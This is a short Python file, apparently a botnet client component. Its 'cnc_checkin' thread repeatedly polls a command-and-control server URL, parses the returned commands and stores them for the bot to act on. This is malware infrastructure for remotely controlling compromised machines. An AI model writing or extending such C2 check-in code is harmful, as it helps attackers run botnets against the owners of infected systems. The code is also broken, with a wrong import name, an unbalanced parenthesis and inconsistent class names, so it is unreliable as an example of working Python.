from bot_helper import parse_commands
from threading import thread
from time import sleep
import requests

class cnc_checkin(Thread,Bot_Instance):

    def __init__(self):
        Thread.__init__(self)
        
    def run(self):
        while(True):
            curr_commands = requests.get(Bot_Instance.cnc_url))
            try:
                curr_commands = parse_commands(curr_commands)

            except:
                raise

            if curr_commands != Bot_Instance.commands:
                Bot_Instance.commands = parse_commands(curr_commands)
            
            sleep(Bot_instance.wait_time)



     
     

